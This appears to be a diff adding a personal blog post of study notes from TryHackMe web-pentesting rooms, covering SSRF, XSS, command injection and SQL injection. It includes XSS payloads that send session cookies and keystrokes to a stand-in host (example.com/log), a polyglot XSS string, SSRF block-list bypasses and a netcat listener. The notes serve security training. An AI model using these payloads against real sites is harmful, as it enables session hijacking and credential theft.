@@ -1,0 +1,188 @@
+---
+title: 'TryHackMe: Jr. Penetration Tester'
+date: 2022-03-19 05:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2022-03-19-tryhackme-jr-penetration-tester.html
+author: 100007
+---
+
+<h1 id="tryhackme-jr-penetration-tester">TryHackMe: Jr. Penetration Tester</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2022-03-19</p>
+<p>As part of a job interview, I’ve been asked to run through an online CTF — the CMD+CTRL Cyber Range “LetSee Marketplace”. After reviewing the available information, I’m pretty sure I’m outclassed by this at my current skill level, but I plan to give it a shot anyway. It should be good learning/practice experience, and the worst that can happen is that I don’t get a second interview.</p>
+<p>To get my head back into the web hacking space (I’ve been focused more on studying for the Security+ certification recently, as I want to have that in the bag sometime around the end of April / beginning of May), I’m going to spend the day working on TryHackMe (specifically rooms focusing on website penetration testing).</p>
+<p>Qapla’!</p>
+<ul>
+<li><a href="https://www.securityinnovation.com/training/cmd-ctrl-cyber-range-security-training/cyber-range-suite/cmdctrl-cyber-range-letsee/">CMD+CTRL Cyber Range: LetSee Marketplace</a></li>
+<li><a href="https://www.urbandictionary.com/define.php?term=Qapla%27">Qapla’</a></li>
+</ul>
+<h2 id="what-is-an-ssrf">What Is an SSRF?</h2>
+<p>SSRF: Server-Side Request Forgery. Basically, this is when an attacker (me!) can cause the web server to make a malicious request to another server (possibly on the back-end, possibly in an entirely different organization).</p>
+<p>SSRF can be “blind”, where not information is returned (but the request is still made).</p>
+<h2 id="ssrf-examples">SSRF Examples</h2>
+<p>Directory traversal can still be used with API requests!</p>
+<p>When attacking an API via SSRF, it’s sometimes necessary to append an empty dummy parameter (<code class="language-plaintext highlighter-rouge">&amp;x=</code>, etc.) to break parsing of appended information. For example, suppose we have a URL like <code class="language-plaintext highlighter-rouge">https://example.com/item?server=api&amp;id=123</code> which gets translated to an API request of <code class="language-plaintext highlighter-rouge">https://api.example.com/api/item?id=123</code>. Then calling <code class="language-plaintext highlighter-rouge">https://example.com/item?server=api.example.com/api/user&amp;x=&amp;id=123</code> could translate into an API request of <code class="language-plaintext highlighter-rouge">https://api.example.com/api/user?x=.example.com/api/item?id=123</code>, allowing us to access the <code class="language-plaintext highlighter-rouge">/api/usr</code> endpoint. (Note that the server here is constructing a <em>new</em> API request string using the values of the <code class="language-plaintext highlighter-rouge">server</code> and <code class="language-plaintext highlighter-rouge">id</code> parameters. We can even add additional parameters here using <code class="language-plaintext highlighter-rouge">?</code>!)</p>
+<p>Sometimes we can trigger a request to a server we control entirely, allowing the capture of API credentials.</p>
+<h2 id="finding-an-ssrf">Finding an SSRF</h2>
+<p>Places to look for SSRF:</p>
+<ul>
+<li>URL bar</li>
+<li>Hidden form fields</li>
+<li>Domains embedded as GET parameters (<code class="language-plaintext highlighter-rouge">?server=</code>, etc.)</li>
+<li>API paths embedded as GET parameters (<code class="language-plaintext highlighter-rouge">?api=/user</code>, etc.)</li>
+</ul>
+<p>“Request Bin” can be used as a stop-gap if you don’t have your own webserver available to capture requests.</p>
+<ul>
+<li><a href="https://requestbin.com/">Request Bin</a></li>
+</ul>
+<h2 id="defeating-common-ssrf-defenses">Defeating Common SSRF Defenses</h2>
+<p>SSRF defenses are normally just a allowed/blocked lists.</p>
+<p>Typically localhost and 169.254.169.254 (TryHackMe indicates that this IP often contains configuration information in cloud systems, though I’m not familiar with it) are often on block lists. This can be bypassed by using non-standard representations of IP addresses, or by using a service such as nip.io to map an arbitrary subdomain to an IP address of your choosing.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: right">IP</th>
+<th style="text-align: right">Decimal</th>
+<th style="text-align: right">Hexadecimal</th>
+<th style="text-align: right">Octal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: right">127.0.0.1</td>
+<td style="text-align: right">2130706433</td>
+<td style="text-align: right">0x7F000001</td>
+<td style="text-align: right">0177000000000001</td>
+</tr>
+<tr>
+<td style="text-align: right">169.254.169.254</td>
+<td style="text-align: right">2852039166</td>
+<td style="text-align: right">0xA9FEA9FE</td>
+<td style="text-align: right">0251037602510376</td>
+</tr>
+</tbody>
+</table>
+<p>Allowed lists are harder to circumvent; often you’ll need to be able to create your own subdomains somewhere. The ngrok service can help tunnel these subdomains back to your local system, though the SSL certificate won’t match for non-ngrok subdomains (i.e., domains you entirely control).</p>
+<p>If the server allows for open redirects, then this functionality can also be used to block domain-based allowed lists.</p>
+<ul>
+<li><a href="https://nip.io/">nip.io</a></li>
+<li><a href="https://ngrok.io/">ngrok</a></li>
+</ul>
+<h2 id="ssrf-practical">SSRF Practical</h2>
+<p>Note that returned SSRF information may be in a variety of formats (for example, a base64-encoded image or cookie).</p>
+<h2 id="xss-payloads">XSS Payloads</h2>
+<p>Typical (but highly annoying) XSS PoC:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>Assuming you control the <code class="language-plaintext highlighter-rouge">example.com</code> domain, you can also log base64-encoded session cookies:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://example.com/log</span><span class="dl">'</span>
+<span class="o">+</span> <span class="dl">'</span><span class="s1">?cookie=</span><span class="dl">'</span>
+<span class="o">+</span> <span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
+<span class="p">);</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>Simple keylogger (seems best to combine with cookie stealing, since otherwise it may be hard to tell who’s typing what!):</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">onkeypress</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">&#x007b;</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://example.com/log</span><span class="dl">'</span>
+<span class="o">+</span> <span class="dl">'</span><span class="s1">?keypress=</span><span class="dl">'</span>
+<span class="o">+</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">)</span>
+<span class="p">);</span>
+<span class="p">&#x007d;</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>You can also use XSS to call functions defined on the target website to manipulate user accounts.</p>
+<h2 id="reflected-xss">Reflected XSS</h2>
+<p>This is when user input is echoed back in an unsafe way <em>without</em> being stored somewhere. Places vulnerable to reflected XSS:</p>
+<ul>
+<li>GET parameters</li>
+<li>URL paths</li>
+<li>HTTP headers and POST parameters (though these are difficult to exploit in practice)</li>
+</ul>
+<p>An attacker requires user cooperation to launch a reflected XSS attack — someone needs to click on a URL, open up a malicious iframe, etc.</p>
+<h2 id="stored-xss">Stored XSS</h2>
+<p>Relevant JavaScript is stored server-side (for example, in a comment).</p>
+<p>Basically, all places that store user information need to be tested for this. Try bypassing client-side checks with Burp Suite, et al.</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/notes/burp-suite.html">Using Burp Suite</a></li>
+</ul>
+<h2 id="dom-based-xss">DOM-Based XSS</h2>
+<p>The difference between this and reflected XSS mostly seems to be that in DOM-based attacks we’re taking advantage of JavaScript code that’s already running on the page — basically looking for interaction points that we can control (such as <code class="language-plaintext highlighter-rouge">window.location.*</code>) that are then passed to unsafe methods (such as <code class="language-plaintext highlighter-rouge">eval()</code> or <code class="language-plaintext highlighter-rouge">innerHTML</code>). The idea is to again use a malicious link, but rather than having the code included directly in the page we’re looking to launder it through an existing (legitimate) JavaScript process.</p>
+<h2 id="blind-xss">Blind XSS</h2>
+<p>Like stored XSS, but where the code goes someplace you can’t directly/initially observe or interact with (for example, a support portal). Because you can’t directly observe blind XSS inclusion, a callback URL (either one you control or something like XSS Hunter) is required.</p>
+<ul>
+<li><a href="https://xsshunter.com/">XSS Hunter</a></li>
+</ul>
+<h2 id="perfecting-your-payload">Perfecting Your Payload</h2>
+<p>A much less annoying XSS test than the typical <code class="language-plaintext highlighter-rouge">&lt;alert/&gt;</code> popup is to use something that manipulates a page element:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="nx">xssTest</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">h1</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">xssTest</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">XSS was here!</span><span class="dl">"</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>Note that you’ll sometimes you’ll need to break out of a tag that you’re being inserted into. Various options:</p>
+<ul>
+<li>Use <code class="language-plaintext highlighter-rouge">"&gt;</code> if you’re being inserted into an HTML attribute.</li>
+<li>Use <code class="language-plaintext highlighter-rouge">&lt;/pre&gt;</code> or <code class="language-plaintext highlighter-rouge">&lt;/textarea&gt;</code> for preformatted blocks and text areas.</li>
+<li>Use <code class="language-plaintext highlighter-rouge">';</code> followed by <code class="language-plaintext highlighter-rouge">;//</code> for direct JavaScript inserts. (Note that it’s only possible to insert <code class="language-plaintext highlighter-rouge">&lt;script/&gt;</code> tags if the JavaScript you’re abusing is being included from a file, as HTML parsers are greedy about the closing <code class="language-plaintext highlighter-rouge">&lt;/script&gt;</code> tag.)</li>
+</ul>
+<p>There is some similarity here to SQLi.</p>
+<p>Note that JavaScript regular expressions, like PHP regular expressions, are only executed in a single pass. Thus, a regular expression that’s filtering out <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;/script&gt;</code> tags can be circumvented by using <code class="language-plaintext highlighter-rouge">&lt;s&lt;script&gt;cript&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;/s&lt;/script&gt;cript&gt;</code>. That said, this trick doesn’t work for regular expressions that are removing single characters (for example, <code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code>).</p>
+<p>You can also use the <code class="language-plaintext highlighter-rouge">onload</code> attribute to pull in JavaScript, though note that this is only functional the first time the page is loaded. This will often require you to close out the preceding attribute (<code class="language-plaintext highlighter-rouge">"</code>) and <em>leave off</em> the trialing <code class="language-plaintext highlighter-rouge">"</code> of the <code class="language-plaintext highlighter-rouge">onload</code> attribute in order for everything to work properly.</p>
+<p>There’s also “polygot” strings which work in a variety of contexts. These have some pretty wild escaping going on; for example, the following (lightly modified from TryHackMe’s example) produces an “XSS” alert:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//<span class="nt">&lt;/stYle</span><span class="err">/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!</span><span class="nt">&gt;&lt;sVg</span><span class="err">/&lt;</span><span class="na">sVg</span><span class="err">/</span><span class="na">oNloAd=</span><span class="s">alert('XSS')//</span><span class="nt">&gt;</span>&gt;
+</code></pre></div></div>
+<p>How one comes up with one of these is a bit beyond me.</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/notes/sql-injection.html">SQL Injection</a></li>
+</ul>
+<h2 id="blind-xss-practical">Blind XSS Practical</h2>
+<p>You can also use <code class="language-plaintext highlighter-rouge">nc -nvlp $PORT</code> as a quick-n-dirty HTTP listener (netcat, it’s not just for catching shells anymore!).</p>
+<p>I have some doubts about how well this works in real, modern life… Every time I tried to test this locally I pulled a CORS error…</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/notes/netcat.html">Using “netcat”</a></li>
+</ul>
+<h2 id="what-is-command-injection">What is Command Injection</h2>
+<p>Command injection — a.k.a. RCE!</p>
+<h2 id="discovering-command-injection">Discovering Command Injection</h2>
+<p>PHP <code class="language-plaintext highlighter-rouge">exec()</code>, Python <code class="language-plaintext highlighter-rouge">subprocess.Popen()</code>, and other other functions that directly execute operating system commands are potentially vulnerable to command injection if they accept user input.</p>
+<h2 id="exploiting-command-injection">Exploiting Command Injection</h2>
+<p>As usual, two types:</p>
+<ul>
+<li>“Verbose” command injection returns some output to the attckers.</li>
+<li>“Blind” command injection does not return a value, so changes to the behavior of the server will need to be observed in order to determine if the injection was successful.</li>
+</ul>
+<p>The canonical tests for blind command injection are things like <code class="language-plaintext highlighter-rouge">ping</code> and <code class="language-plaintext highlighter-rouge">sleep</code> that should cause a controllable hang. Sometimes it’s also possible to generate a file that can be read later in some way.</p>
+<p>The Windows equivalent of <code class="language-plaintext highlighter-rouge">sleep</code> is <code class="language-plaintext highlighter-rouge">timeout</code>.</p>
+<h2 id="remediating-command-injection">Remediating Command Injection</h2>
+<p>PHP functions susceptible to command injection (again!): <code class="language-plaintext highlighter-rouge">exec()</code>, <code class="language-plaintext highlighter-rouge">passthru()</code>, <code class="language-plaintext highlighter-rouge">system()</code>.</p>
+<p>Note that PHP accepts hexadecimal characters codes in strings (<code class="language-plaintext highlighter-rouge">/</code> is <code class="language-plaintext highlighter-rouge">/</code>, for example).</p>
+<h2 id="in-band-sqli">In-Band SQLi</h2>
+<p>In-band SQLi is just when the results of the injection are returned directly to the attacker.</p>
+<p>If errors are returned, then it’s generally possible to enumerate the entire database. If UNION statements can be executed, then it’s generally possible to <em>exfiltrate</em> the entire database (see TryHackme’s “Jurassic Park” CTF).</p>
+<p>Useful MySQL function: <code class="language-plaintext highlighter-rouge">GROUP_CONCAT()</code> concatenates fields (and arbitrary strings) in a row, and then further groups rows separated by commas (or by a string specified using SEPARATOR).</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/notes/tryhackme-jurassic-park.html">TryHackMe: Jurassic park</a></li>
+</ul>
+<h2 id="blind-sqli">Blind SQLi</h2>
+<p>Blind SQLi is just in-band SQLi without error messages for feedback.</p>
+<h3 id="authentication-bypasses">Authentication Bypasses</h3>
+<p>The trick here is that most login forms use the backing database for authentication, so all we need to do is return a “true” result — we don’t really need to guess anyone’s password. Sometimes we don’t even need to know a username (though I suspect that in practice this may lead to weird authorization problems).</p>
+<h3 id="boolean-based-sqli">Boolean-Based SQLi</h3>
+<p>This is where we just learn if our query was successful or not. Common with API endpoints.</p>
+<p>You can enumerate a database this way, and even exfiltrate information, but it kinda sucks. Use SQLmap, if possible.</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/notes/sqlmap.html">Using SQLmap</a></li>
+</ul>
+<h3 id="time-based-sqli">Time-Based SQLi</h3>
+<p>This is basically boolean-based SQLi, except that we’re not even getting back true/false information anymore. However, we can introduce a timing attack by replacing a column with <code class="language-plaintext highlighter-rouge">sleep()</code> (which sleeps the connection for the specified number of seconds). If the query fails we’ll get a return immediately, but if it succeeds then we’ll experience the programmed pause.</p>
+<h2 id="out-of-band-sqli">Out-of-Band SQLi</h2>
+<p>Out-of-band SQLi only works if the application or database makes external calls (preferably to a system we control!) based on the results of a database query (that we can inject into). Thus, there are always two channels — an attack channel and a data channel.</p>
+<p>DNS is a popular data channel for out-of-band SQLi attacks.</p>
+<h2 id="remediating-sqli">Remediating SQLi</h2>
+<ul>
+<li>Use prepared statements.</li>
+<li>Use input validation.</li>
+<li>Escape strings before passing them along to SQL statements.</li>
+</ul>
